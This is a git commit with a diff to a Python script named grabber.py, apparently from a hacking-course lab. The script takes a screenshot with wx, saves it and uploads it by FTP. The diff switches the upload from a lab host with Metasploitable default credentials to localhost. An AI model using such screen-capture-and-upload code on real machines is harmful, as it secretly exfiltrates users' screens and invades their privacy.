90c850908e480784d2eb281fc180d5dd4580f317
Jimmy Xiang <xxg1413@gmail.com>
2020-12-03 21:58:27 +0800

    update grabber.py

--- 03/grabber.py
+++ 03/grabber.py
@@ -9,12 +9,11 @@ bmap = wx.Bitmap(size[0],size[1])
 memo = wx.MemoryDC(bmap)
 memo.Blit(0,0,size[0],size[1],screen,0,0)
 
-del memo 
 bmap.SaveFile("grabbed.png", wx.BITMAP_TYPE_PNG)
 
-sess_ = ftplib.FTP("192.168.85.128", "msfadmin", "msfadmin")
+sess_ = ftplib.FTP("localhost","flypython", "flypython")
 file_ = open("grabbed.png", "rb")
-sess_.storbinary("STOR /tmp/grabbed.png", file_)
+sess_.storbinary("STOR  grabbed.png", file_)
 
 file_.close()
 sess_.quit()
